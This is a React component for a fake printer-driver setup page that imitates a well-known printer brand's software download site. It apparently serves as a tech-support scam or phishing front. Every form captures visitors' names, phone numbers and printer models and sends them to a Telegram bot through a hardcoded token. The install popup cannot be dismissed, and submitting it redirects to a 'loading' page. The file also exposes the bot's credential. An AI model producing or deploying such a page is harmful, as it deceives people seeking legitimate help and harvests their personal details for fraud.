import React, { useState } from "react";
import {
  Container,
  Row,
  Col,
  Form,
  Button,
  Navbar,
  Nav,
} from "react-bootstrap";
import { useNavigate } from "react-router-dom";
import Logo from "../assets/brand_logo.png"; // Ensure this is a generic logo
import Printer from "../assets/defaultPrinterSetup (1).png"; // Generic printer image
import BackgroundImage from "../assets/top_background_image.png"; // Generic background image
import Assist from "../assets/person_assist (1).png"; // Generic assist icon
import BrandImage from "../assets/Heading.png";
import BrandImage2 from "../assets/Heading2.png"; // Placeholder for the "HP" image

// Sample Printer Suggestions (100 Entries, Generic Names)
const printerSuggestions = [
  "Office Printer 9010",
  "Desk Printer 1210",
  "Desk Printer 2332",
  "Desk Printer 2720",
  "Desk Printer 2721",
  "Desk Printer 2722",
  "Desk Printer 2724",
  "Desk Printer 2725",
  "Desk Printer 2729",
  "Desk Printer 2732",
  "Desk Printer 2752",
  "Desk Printer 2755",
  "Desk Printer Plus 4130",
  "Desk Printer Plus 4140",
  "Desk Printer Plus 4152",
  "Desk Printer Plus 4155",
  "Desk Printer Plus 4158",
  "Envy Printer 6000",
  "Envy Printer 6002",
  "Envy Printer 6004",
  "Envy Printer 6005",
  "Envy Printer 6007",
  "Envy Printer 6008",
  "Envy Printer 6009",
  "Envy Printer 6010",
  "Envy Printer 6012",
  "Envy Printer 6014",
  "Envy Printer 6015",
  "Envy Printer 6017",
  "Envy Printer 6018",
  "Envy Printer 6022",
  "Envy Printer 6024",
  "Envy Printer 6027",
  "Envy Printer 6030",
  "Envy Printer 6032",
  "Envy Printer 6034",
  "Envy Printer 6035",
  "Envy Printer 6037",
  "Envy Printer 6038",
  "Envy Printer 6052",
  "Envy Printer 6055",
  "Envy Printer 6058",
  "Envy Printer 6075",
  "Envy Printer 6430",
  "Envy Printer 6432",
  "Envy Printer 6434",
  "Envy Printer 6435",
  "Envy Printer 6437",
  "Envy Printer 6438",
  "Envy Printer 6452",
  "Envy Printer 6455",
  "Envy Printer 6458",
  "Envy Printer 6475",
  "Envy Pro Printer 6452",
  "Envy Pro Printer 6455",
  "Envy Pro Printer 6458",
  "Envy Pro Printer 6475",
  "Office Printer 250",
  "Office Printer 250 Mobile",
  "Office Printer 252",
  "Office Printer 252 Mobile",
  "Office Printer 3830",
  "Office Printer 3831",
  "Office Printer 3832",
  "Office Printer 3833",
  "Office Printer 3834",
  "Office Printer 3835",
  "Office Printer 3836",
  "Office Printer 3838",
  "Office Printer 3839",
  "Office Printer 4650",
  "Office Printer 4652",
  "Office Printer 4654",
  "Office Printer 4655",
  "Office Printer 4657",
  "Office Printer 4658",
  "Office Printer 4659",
  "Office Printer 5220",
  "Office Printer 5222",
  "Office Printer 5230",
  "Office Printer 5232",
  "Office Printer 5252",
  "Office Printer 5255",
  "Office Printer 5258",
  "Office Printer 5260",
  "Office Printer 5264",
  "Office Printer 5265",
  "Office Printer 5267",
  "Office Printer 5268",
  "Office Printer 5275",
  "Office Printer 5276",
  "Office Printer 5278",
  "Office Printer 6000",
  "Office Printer 6000 Wireless",
  "Office Printer 6100",
  "Office Printer 6100 ePrinter",
  "Office Printer 6200",
  "Office Printer 6210",
  "Office Printer 6210v",
  "Office Printer 6210xi",
  "Office Printer 6220",
  "Office Printer 6300",
  "Office Printer 6310",
  "Office Printer 6310v",
  "Office Printer 6310xi",
  "Office Printer 6500",
  "Office Printer 6500 Wireless",
  "Office Printer 6500A",
  "Office Printer 6500A Plus",
  "Office Printer 7000",
  "Office Printer 7110",
  "Office Printer 7130",
  "Office Printer 7140xi",
  "Office Printer 7210",
  "Office Printer 7210v",
  "Office Printer 7210xi",
  "Office Printer 7300",
  "Office Printer 7310",
  "Office Printer 7310xi",
  "Office Printer 7313",
  "Office Printer 7400",
  "Office Printer 7410",
  "Office Printer 7410xi",
  "Office Printer 7500A",
  "Office Printer 7610",
  "Office Printer 7612",
  "Office Printer 7700",
  "Office Printer 8600",
  "Office Printer 8600 Plus",
  "Office Printer 8600 Premium",
  "Office Printer 8610",
  "Office Printer 8620",
  "Office Printer 8630",
  "Office Printer 8702",
  "Office Printer 8710",
  "Office Printer 8715",
  "Office Printer 8720",
  "Office Printer 8725",
  "Office Printer 8730",
  "Office Printer 8740",
  "Office Printer Pro 6230",
  "Office Printer Pro 6230 ePrinter",
  "Office Printer Pro 6830",
  "Office Printer Pro 6835",
  "Office Printer Pro 6960",
  "Office Printer Pro 6968",
  "Office Printer Pro 6970",
  "Office Printer Pro 6975",
  "Office Printer Pro 6978",
  "Office Printer Pro 8020",
  "Office Printer Pro 8025",
  "Office Printer Pro 8028",
  "Office Printer Pro 8030",
  "Office Printer Pro 8035",
  "Office Printer Pro 8210",
  "Office Printer Pro 8216",
  "Office Printer Pro 8218",
  "Office Printer Pro 8600",
  "Office Printer Pro 8600 Plus",
  "Office Printer Pro 8600 Premium",
  "Office Printer Pro 8610",
  "Office Printer Pro 8620",
  "Office Printer Pro 8630",
  "Office Printer Pro 8640",
  "Office Printer Pro 8660",
  "Office Printer Pro 8710",
  "Office Printer Pro 8720",
  "Office Printer Pro 8730",
  "Office Printer Pro 8740",
  "Office Printer Pro X451dw",
  "Office Printer Pro X476dw",
  "Office Printer Pro X551dw",
  "Office Printer Pro X576dw",
  "PageWide Printer Pro 352dw",
  "PageWide Printer Pro 377dw",
  "PageWide Printer Pro 452dw",
  "PageWide Printer Pro 477dw",
  "PageWide Printer Pro 552dw",
  "PageWide Printer Pro 577dw",
  "PageWide Printer Enterprise Color 556dn",
  "PageWide Printer Enterprise Color 586dn",
  "PageWide Printer Managed Color MFP P57750dw",
  "PageWide Printer Managed Color MFP P55250dw",
  "PageWide Printer Managed Color MFP P77740z",
  "PageWide Printer Managed Color MFP P77750z",
  "PageWide Printer Managed Color MFP P77760z",
  "PageWide Printer Managed P55250dw",
  "PageWide Printer Managed P57750dw",
  "PageWide Printer Managed P75250dw",
  "PageWide Printer Managed P77740z",
  "PageWide Printer Managed P77750z",
  "PageWide Printer Managed P77760z",
  "Laser Printer Pro M12a",
  "Laser Printer Pro M12w",
  "Laser Printer Pro M15a",
  "Laser Printer Pro M15w",
  "Laser Printer Pro M17a",
  "Laser Printer Pro M17w",
  "Laser Printer Pro M102a",
  "Laser Printer Pro M102w",
  "Laser Printer Pro M104a",
  "Laser Printer Pro M104w",
  "Desk Printer",
  "Envy Printer",
  "Laser Printer",
  "Office Printer",
  "Office Printer Pro",
  "PageWide Printer",
  "PageWide Printer Pro",
  "PageWide Printer Enterprise",
  "Smart Tank Printer",
  "Neverstop Laser Printer",
  "Design Printer",
  "Latex Printer",
  "Scitex Printer",
  "Indigo Digital Press",
  "Ink Tank Printer",
  "PhotoSmart Printer",
  "Color Laser Printer",
  "Mono Laser Printer",
  "Desk Printer Plus",
  "Envy Pro Printer",
  "Office Printer Mobile",
  "Office Printer Wide Format",
  "PageWide Printer Managed",
  "Desk Printer 2755",
  "Envy Printer 6055",
  "Laser Printer Pro MFP M227fdw",
  "Smart Tank Printer 7001",
  "Neverstop Laser Printer 1001nw",
  "Office Printer Pro 8025e",
  "Desk Printer Plus 4155",
  "Envy Pro Printer 6455",
  "Laser Printer MFP M234dwe",
  "Desk Printer 1212",
  "Desk Printer 2331",
  "Desk Printer 2723e",
  "Desk Printer Plus 4120",
  "Envy Printer 6020e",
  "Envy Pro Printer 6420",
  "Office Printer 8012e",
  "Office Printer Pro 8022e",
  "Office Printer Pro 9012e",
  "Office Printer Pro 9022e",
  "Laser Printer MFP 137fnw",
  "Laser Printer MFP 138fnw",
  "Laser Printer Pro M15w",
  "Laser Printer Pro MFP M28w",
  "Laser Printer Pro MFP M130nw",
  "Laser Printer Pro MFP M227fdw",
  "Color Laser Printer Pro M255dw",
  "Color Laser Printer Pro MFP M182nw",
  "Color Laser Printer Pro MFP M283fdw",
  "Laser Printer Enterprise M507dn",
  "Smart Tank Printer 500",
  "Smart Tank Printer 515",
  "Smart Tank Printer 530",
  "Smart Tank Printer 615",
  "Smart Tank Printer 670",
  "Smart Tank Printer 720",
  "Smart Tank Printer 750",
  "Smart Tank Printer 790",
  "Smart Tank Printer 850",
  "Smart Tank Printer 870",
  "Design Printer T210",
  "Design Printer T230",
  "Design Printer T630",
  "Design Printer T650",
  "Design Printer Studio 24-in",
  "Design Printer Studio 36-in",
  "Design Printer Z6",
  "Design Printer Z9+",
  "Design Printer XL 3600",
  "Design Printer T1600",
  "PageWide Printer Pro 477dw",
  "PageWide Printer Pro 577dw",
  "PageWide Printer Pro 452dw",
  "PageWide Printer Pro 552dw",
  "PageWide Printer Enterprise Color 556dn",
  "PageWide Printer Enterprise Color 586dn",
  "PageWide Printer Managed Color MFP P77940dn",
  "PageWide Printer Managed Color MFP P77950dn",
  "PageWide Printer Managed Color MFP P77440dn",
  "PageWide Printer Managed Color MFP P77960dn",
  "Neverstop Laser Printer 1000a",
  "Neverstop Laser Printer 1000w",
  "Neverstop Laser Printer MFP 1200a",
  "Neverstop Laser Printer MFP 1200w",
  "Neverstop Laser Printer MFP 1202nw",
  "Neverstop Laser Printer 1001nw",
  "Neverstop Laser Printer 1020n",
  "Neverstop Laser Printer 1030a",
  "Neverstop Laser Printer 1030w",
  "Neverstop Laser Printer MFP 1201n",
  "Laser Printer Enterprise MFP M528f",
  "Laser Printer Enterprise MFP M528dn",
  "Laser Printer Enterprise MFP M578dn",
  "Laser Printer Enterprise MFP M578f",
  "Laser Printer Enterprise Flow MFP M528c",
  "Laser Printer Enterprise Flow MFP M578c",
  "Laser Printer Enterprise 700 M712dn",
  "Laser Printer Enterprise 700 M712xh",
  "Laser Printer Enterprise 700 MFP M725dn",
  "Laser Printer Enterprise 700 MFP M725f",
  "Laser Printer Enterprise 700 MFP M725z",
  "Laser Printer Enterprise M806dn",
  "Laser Printer Enterprise MFP M830z",
  "Laser Printer Enterprise MFP M631dn",
  "Laser Printer Enterprise MFP M632fht",
  "Laser Printer Enterprise MFP M633fh",
  "Laser Printer Enterprise Flow MFP M631h",
  "Laser Printer Enterprise Flow MFP M632z",
  "Laser Printer Enterprise Flow MFP M633z",
  "Laser Printer Enterprise M609dn",
  "Laser Printer Enterprise M607n",
  "Laser Printer Enterprise M608dn",
  "Laser Printer Enterprise M608n",
  "Laser Printer Enterprise M609dh",
  "Laser Printer Enterprise MFP M725z+",
  "Laser Printer Enterprise M806x+",
  "Laser Printer Enterprise Flow MFP M830z+",
  "Color Laser Printer Enterprise MFP M681dh",
  "Color Laser Printer Enterprise MFP M681f",
  "Color Laser Printer Enterprise MFP M682z",
  "Color Laser Printer Enterprise Flow MFP M681z",
  "Color Laser Printer Enterprise M553n",
  "Color Laser Printer Enterprise M553dn",
  "Color Laser Printer Enterprise M553x",
  "Color Laser Printer Enterprise M750dn",
  "Color Laser Printer Enterprise M750n",
  "Color Laser Printer Enterprise M750xh",
  "Color Laser Printer Enterprise M856dn",
  "Color Laser Printer Enterprise Flow MFP M776z",
  "Color Laser Printer Enterprise Flow MFP M776zs",
  "Color Laser Printer Enterprise MFP M776dn",
  "Color Laser Printer Enterprise MFP M776f",
  "Color Laser Printer Enterprise MFP M776z+",
  "Color Laser Printer Enterprise Flow MFP M776z+",
  ...Array(90)
    .fill()
    .map((_, i) => `Generic Printer Model ${i + 1}`),
];

// Define PopupForm as a separate component to prevent re-creation on render
const PopupForm = ({
  onSubmit,
  name,
  setName,
  number,
  setNumber,
  model,
  setModel,
  onClose,
}) => (
  <Form onSubmit={onSubmit}>
    <Form.Group style={{ marginBottom: "20px", textAlign: "left" }}>
      <Form.Label
        style={{
          fontSize: "1.2rem",
          fontWeight: "500",
          color: "#333",
        }}
      >
        Name
      </Form.Label>
      <Form.Control
        type="text"
        value={name}
        onChange={(e) => setName(e.target.value)}
        required
        style={{
          fontSize: "1.2rem",
          padding: "12px",
          borderRadius: "8px",
          border: "1px solid #ccc",
          backgroundColor: "#fff",
        }}
        onBlur={() => console.log("Name input lost focus")} // Debug focus loss
      />
    </Form.Group>
    <Form.Group style={{ marginBottom: "20px", textAlign: "left" }}>
      <Form.Label
        style={{
          fontSize: "1.2rem",
          fontWeight: "500",
          color: "#333",
        }}
      >
        Number
      </Form.Label>
      <Form.Control
        type="text"
        value={number}
        onChange={(e) => setNumber(e.target.value)}
        required
        style={{
          fontSize: "1.2rem",
          padding: "12px",
          borderRadius: "8px",
          border: "1px solid #ccc",
          backgroundColor: "#fff",
        }}
        onBlur={() => console.log("Number input lost focus")} // Debug focus loss
      />
    </Form.Group>
    <Form.Group style={{ marginBottom: "20px", textAlign: "left" }}>
      <Form.Label
        style={{
          fontSize: "1.2rem",
          fontWeight: "500",
          color: "#333",
        }}
      >
        Model
      </Form.Label>
      <Form.Control
        type="text"
        value={model}
        onChange={(e) => setModel(e.target.value)}
        required
        style={{
          fontSize: "1.2rem",
          padding: "12px",
          borderRadius: "8px",
          border: "1px solid #ccc",
          backgroundColor: "#fff",
        }}
        onBlur={() => console.log("Model input lost focus")} // Debug focus loss
      />
    </Form.Group>
    <div style={{ display: "flex", justifyContent: "space-between" }}>
      <Button
        type="submit"
        style={{
          borderRadius: "50px",
          padding: "12px 30px",
          background: "#005A9C",
          color: "#fff",
          border: "none",
          fontWeight: "600",
          fontSize: "1.2rem",
          fontFamily: "Arial, sans-serif",
          transition: "background 0.3s",
        }}
        onMouseOver={(e) => (e.target.style.background = "#004080")}
        onMouseOut={(e) => (e.target.style.background = "#005A9C")}
      >
        Submit
      </Button>
      {/* <Button
        variant="secondary"
        onClick={onClose} // Add Close button functionality
        style={{
          borderRadius: "50px",
          padding: "12px 30px",
          background: "#6c757d",
          color: "#fff",
          border: "none",
          fontWeight: "600",
          fontSize: "1.2rem",
          fontFamily: "Arial, sans-serif",
        }}
      >
        Close
      </Button> */}
    </div>
  </Form>
);

const PrinterSetup = () => {
  const [searchTerm, setSearchTerm] = useState("");
  const [filteredSuggestions, setFilteredSuggestions] = useState([]);
  const [showSuggestions, setShowSuggestions] = useState(false);
  const [showInstallPopup, setShowInstallPopup] = useState(false);
  const [showSmartPopup, setShowSmartPopup] = useState(false);
  const [showProductNamePopup, setShowProductNamePopup] = useState(false);
  const [showDeviceNotListedPopup, setShowDeviceNotListedPopup] =
    useState(false);
  const [name, setName] = useState("");
  const [number, setNumber] = useState("");
  const [model, setModel] = useState("");
  const navigate = useNavigate();

  // Handle Search Input
  const handleSearchChange = (e) => {
    const input = e.target.value;
    setSearchTerm(input);

    if (input.length > 0) {
      const filtered = printerSuggestions.filter((printer) =>
        printer.toLowerCase().includes(input.toLowerCase())
      );
      setFilteredSuggestions(filtered.slice(0, 10));
      setShowSuggestions(true);
    } else {
      setShowSuggestions(false);
    }
  };

  // Handle Suggestion Click
  const handleSuggestionClick = (printer) => {
    setSearchTerm(printer);
    setShowSuggestions(false);
  };

  // Handle Install Button Click
  const handleInstall = () => {
    setShowInstallPopup(true);
  };

  // Handle Smart Button Click
  const handleSmart = () => {
    setShowSmartPopup(true);
  };

  // Handle Popup Form Submission and Send to Telegram
  const handleSubmit = async (e, redirect = false) => {
    e.preventDefault();
    const telegramBotToken = "7838848439:AAH_fP2K2OUBNCdjo9htraWVtTYQQzUzsmM";
    const chatId = "1684000886";
    const messageText = `Name: ${name}\nNumber: ${number}\nModel: ${model}`;

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: messageText }),
        }
      );
      const data = await response.json();
      if (data.ok) {
        console.log("Message sent to Telegram successfully!");
        if (redirect) {
          navigate("/printer/loading");
        }
      } else {
        console.error("Telegram API error:", data);
      }

      // Close all popups after submission
      setShowInstallPopup(false);
      setShowSmartPopup(false);
      setShowProductNamePopup(false);
      setShowDeviceNotListedPopup(false);

      // Reset form fields
      setName("");
      setNumber("");
      setModel("");
    } catch (error) {
      console.error("Error sending to Telegram:", error);
    }
  };

  // Close Popup Handler
  const closePopup = () => {
    setShowInstallPopup(false);
    setShowSmartPopup(false);
    setShowProductNamePopup(false);
    setShowDeviceNotListedPopup(false);
    // Reset form fields when closing without submitting
    setName("");
    setNumber("");
    setModel("");
  };

  return (
    <div
      style={{
        fontFamily: "Arial, sans-serif",
        position: "relative",
      }}
    >
      {/* Navbar Section */}
      <Navbar expand="lg" style={{ background: "#fff", padding: "7px 20px" }}>
        <Navbar.Brand href="#">
          <img src={Logo} alt="Brand Logo" style={{ width: "50px" }} />
        </Navbar.Brand>
        <Nav className="ml-2" style={{ color: "#808080" }}>
          {[
            "Office Printers",
            "Desk Printers",
            "Envy Printers",
            "Laser Printers",
          ].map((item, index) => (
            <Nav.Link
              key={index}
              href="#"
              style={{
                color: "#808080",
                fontWeight: "normal",
                fontSize: "16px",
                marginRight: "15px",
                fontFamily: "Arial, sans-serif",
              }}
            >
              {item}
            </Nav.Link>
          ))}
        </Nav>
      </Navbar>

      {/* Header Section with Background Image */}
      <div
        style={{
          backgroundImage: `url(${BackgroundImage})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          height: "55vh",
          display: "flex",
          alignItems: "center",
          color: "#fff",
          position: "relative",
          zIndex: "1",
        }}
      >
        <Container>
          <Row className="align-items-center">
            <Col md={6}>
              <h1
                style={{
                  textAlign: "left",
                  lineHeight: "1.4",
                  fontSize: "2.5rem",
                  fontWeight: "700",
                  marginBottom: "1.5rem",
                  display: "flex",
                  alignItems: "center",
                }}
              >
                <img
                  src={BrandImage}
                  alt="Brand Name"
                  style={{ height: "40px", marginLeft: "10px" }}
                />{" "}
              </h1>
              <p
                style={{
                  fontSize: "1.2rem",
                  textAlign: "left",
                  lineHeight: "1.6",
                  fontWeight: "400",
                  marginBottom: "2rem",
                }}
              >
                Enter your product name and model number to get the right
                software and drivers for you.
              </p>

              {/* Search Form with Autocomplete, Install, and Smart Buttons */}
              <Form style={{ position: "relative", maxWidth: "700px" }}>
                <div
                  style={{
                    display: "flex",
                    alignItems: "center",
                    gap: "15px",
                    marginBottom: "1.5rem",
                  }}
                >
                  <Form.Control
                    type="text"
                    placeholder="Enter product name (e.g., Office Printer 9010)"
                    value={searchTerm}
                    onChange={handleSearchChange}
                    style={{
                      borderRadius: "50px",
                      border: "2px solid #fff",
                      fontSize: "1.2rem",
                      padding: "15px 25px",
                      flex: "1",
                      minWidth: "500px",
                      fontWeight: "400",
                    }}
                    onFocus={() => setShowSuggestions(true)}
                    onBlur={() =>
                      setTimeout(() => setShowSuggestions(false), 200)
                    }
                  />
                  <Button
                    onClick={handleInstall}
                    style={{
                      borderRadius: "50px",
                      padding: "12px 30px",
                      background: "#fff",
                      color: "#005A9C",
                      border: "none",
                      fontWeight: "600",
                      fontSize: "1.2rem",
                      fontFamily: "Arial, sans-serif",
                    }}
                  >
                    Install
                  </Button>
                  <Button
                    onClick={handleSmart}
                    style={{
                      borderRadius: "50px",
                      padding: "12px 30px",
                      background: "#fff",
                      color: "#005A9C",
                      border: "none",
                      fontWeight: "600",
                      fontSize: "1.2rem",
                      fontFamily: "Arial, sans-serif",
                    }}
                  >
                    <img
                      src={BrandImage2}
                      alt="Brand Smart"
                      style={{ height: "30px", marginRight: "5px" }}
                    />
                  </Button>
                </div>
                {showSuggestions && (
                  <div
                    style={{
                      position: "absolute",
                      width: "100%",
                      background: "#fff",
                      color: "#000",
                      boxShadow: "0px 4px 6px rgba(0,0,0,0.1)",
                      borderRadius: "10px",
                      marginTop: "5px",
                      maxHeight: "200px",
                      overflowY: "auto",
                      zIndex: "3",
                    }}
                  >
                    {filteredSuggestions.map((printer, index) => (
                      <div
                        key={index}
                        onClick={() => handleSuggestionClick(printer)}
                        style={{
                          padding: "12px 15px",
                          cursor: "pointer",
                          borderBottom: "1px solid #ddd",
                          fontSize: "1.1rem",
                          fontWeight: "400",
                        }}
                        onMouseDown={(e) => e.preventDefault()}
                      >
                        {printer}
                      </div>
                    ))}
                  </div>
                )}
              </Form>

              {/* Help Links */}
              <div style={{ marginTop: "1.5rem", textAlign: "left" }}>
                <a
                  href="#!"
                  onClick={(e) => {
                    e.preventDefault();
                    setShowProductNamePopup(true);
                  }}
                  style={{
                    color: "#fff",
                    fontSize: "1rem",
                    fontWeight: "600",
                    fontFamily: "Arial, sans-serif",
                    marginBottom: "0.5rem",
                    display: "block",
                  }}
                >
                  Where's the product name?
                </a>
                <a
                  href="#!"
                  onClick={(e) => {
                    e.preventDefault();
                    setShowDeviceNotListedPopup(true);
                  }}
                  style={{
                    color: "#fff",
                    fontSize: "1rem",
                    fontWeight: "600",
                    fontFamily: "Arial, sans-serif",
                  }}
                >
                  My device is not listed
                </a>
              </div>
            </Col>
          </Row>
        </Container>

        {/* Printer Image */}
        <img
          src={Printer}
          alt="Generic Printer Illustration"
          style={{
            position: "absolute",
            right: "8%",
            top: "95%",
            transform: "translateY(-50%)",
            width: "230px",
            zIndex: "2",
          }}
        />
      </div>

      {/* Content Section */}
      <Container style={{ padding: "3rem 0" }}>
        <Row>
          <Col md={8}>
            <p
              style={{
                marginTop: "20px",
                color: "#6c757d",
                fontSize: "1.1rem",
                fontWeight: "400",
              }}
            >
              Install printer software and drivers on each mobile device or
              computer you want to print from. Add the printer on the new
              device.
              <br />
              <br />
              <img
                src={Assist}
                alt="Assistance Icon"
                style={{
                  width: "40px",
                  verticalAlign: "middle",
                  marginRight: "10px",
                }}
              />{" "}
              Need additional help with setup?{" "}
              <a
                href="https://support.hp.com"
                target="_blank"
                rel="noopener noreferrer"
                style={{
                  color: "#005A9C",
                  fontWeight: "600",
                  fontSize: "1.1rem",
                  fontFamily: "Arial, sans-serif",
                }}
              >
                Visit Official Support
              </a>
            </p>
          </Col>
        </Row>
      </Container>

      {/* Popup for Install Button */}
      {showInstallPopup && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: "rgba(0, 0, 0, 0.6)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 1000,
          }}
          onKeyDown={(e) => {
            if (e.key === "Escape") {
              e.preventDefault(); // Prevent closing with Esc key
            }
          }}
          tabIndex={0} // Make the div focusable to capture key events
        >
          <div
            style={{
              background: "#f9f9f9",
              padding: "30px",
              borderRadius: "15px",
              width: "400px",
              textAlign: "center",
              boxShadow: "0 8px 16px rgba(0, 0, 0, 0.2)",
              border: "1px solid #e0e0e0",
            }}
          >
            <h3
              style={{
                fontSize: "1.8rem",
                fontWeight: "600",
                color: "#005A9C",
                marginBottom: "20px",
                fontFamily: "Arial, sans-serif",
              }}
            >
              Installation Details
            </h3>
            <PopupForm
              onSubmit={(e) => handleSubmit(e, true)}
              name={name}
              setName={setName}
              number={number}
              setNumber={setNumber}
              model={model}
              setModel={setModel}
            />
          </div>
        </div>
      )}

      {/* Popup for Smart Button */}
      {showSmartPopup && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: "rgba(0, 0, 0, 0.6)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 1000,
          }}
          onClick={closePopup}
        >
          <div
            style={{
              background: "#f9f9f9",
              padding: "30px",
              borderRadius: "15px",
              width: "400px",
              textAlign: "center",
              boxShadow: "0 8px 16px rgba(0, 0, 0, 0.2)",
              border: "1px solid #e0e0e0",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h3
              style={{
                fontSize: "1.8rem",
                fontWeight: "600",
                color: "#005A9C",
                marginBottom: "20px",
                fontFamily: "Arial, sans-serif",
              }}
            >
              Smart App Installation Details
            </h3>
            <PopupForm
              onSubmit={(e) => handleSubmit(e, true)}
              name={name}
              setName={setName}
              number={number}
              setNumber={setNumber}
              model={model}
              setModel={setModel}
              onClose={closePopup}
            />
          </div>
        </div>
      )}

      {/* Popup for "Where's the product name?" */}
      {showProductNamePopup && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: "0",
            bottom: "0",
            background: "rgba(0, 0, 0, 0.6)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 1000,
          }}
          onClick={closePopup}
        >
          <div
            style={{
              background: "#f9f9f9",
              padding: "30px",
              borderRadius: "15px",
              width: "400px",
              textAlign: "center",
              boxShadow: "0 8px 16px rgba(0, 0, 0, 0.2)",
              border: "1px solid #e0e0e0",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h3
              style={{
                fontSize: "1.8rem",
                fontWeight: "600",
                color: "#005A9C",
                marginBottom: "20px",
                fontFamily: "Arial, sans-serif",
              }}
            >
              Finding Your Product Name
            </h3>
            <p
              style={{
                fontSize: "1.1rem",
                color: "#333",
                marginBottom: "20px",
              }}
            >
              The product name is typically located on the front or top of your
              printer. It may also be found on a label on the back or bottom of
              the device.
            </p>
            <PopupForm
              onSubmit={(e) => handleSubmit(e)}
              name={name}
              setName={setName}
              number={number}
              setNumber={setNumber}
              model={model}
              setModel={setModel}
              onClose={closePopup}
            />
          </div>
        </div>
      )}

      {/* Popup for "My device is not listed" */}
      {showDeviceNotListedPopup && (
        <div
          style={{
            position: "fixed",
            top: 0,
            left: 0,
            right: 0,
            bottom: 0,
            background: "rgba(0, 0, 0, 0.6)",
            display: "flex",
            justifyContent: "center",
            alignItems: "center",
            zIndex: 1000,
          }}
          onClick={closePopup}
        >
          <div
            style={{
              background: "#f9f9f9",
              padding: "30px",
              borderRadius: "15px",
              width: "400px",
              textAlign: "center",
              boxShadow: "0 8px 16px rgba(0, 0, 0, 0.2)",
              border: "1px solid #e0e0e0",
            }}
            onClick={(e) => e.stopPropagation()}
          >
            <h3
              style={{
                fontSize: "1.8rem",
                fontWeight: "600",
                color: "#005A9C",
                marginBottom: "20px",
                fontFamily: "Arial, sans-serif",
              }}
            >
              Device Not Listed
            </h3>
            <p
              style={{
                fontSize: "1.1rem",
                color: "#333",
                marginBottom: "20px",
              }}
            >
              If your device is not listed, please provide your details, and
              we’ll assist you.
            </p>
            <PopupForm
              onSubmit={(e) => handleSubmit(e)}
              name={name}
              setName={setName}
              number={number}
              setNumber={setNumber}
              model={model}
              setModel={setModel}
              onClose={closePopup}
            />
          </div>
        </div>
      )}
    </div>
  );
};

export default PrinterSetup;
